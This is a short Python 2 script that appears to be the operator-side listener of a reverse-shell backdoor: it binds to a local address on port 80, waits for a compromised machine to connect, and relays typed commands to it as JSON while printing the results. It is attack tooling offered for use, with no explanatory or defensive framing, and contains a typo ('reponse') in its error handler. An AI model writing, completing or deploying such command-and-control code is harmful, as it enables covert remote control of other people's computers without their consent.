#...............use python2 while running this.............


import socket
import subprocess
import json
class Listener:
  def __init__(self,ip,port):
    listener=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    listener.bind((ip,port))
    listener.listen(0)
    print('[+] waiting for incoming connection')
    self.connection,address=listener.accept()
    print('got connection from'+str(address))
  def box_send(self,data):
    json_data=json.dumps(data)
    self.connection.send(json_data.encode("utf-8"))
  def box_receive(self):
    json_data=""
    while True:
      try:
        json_data=json_data+str(self.connection.recv(1024))
        return json.loads(json_data)
      except ValueError:
        continue
  def execute(self,command):
    self.box_send(command)
    if command=="exit":
      self.connection.close()
      exit()
    return self.box_receive()
  def run(self):
    while True:
      try:
        command=raw_input(">>")
        response=self.execute(command)
        print(response)
      except Exception:
        response="error in command"
        print(reponse)
listener1=Listener('192.168.1.29',80)
listener1.run()
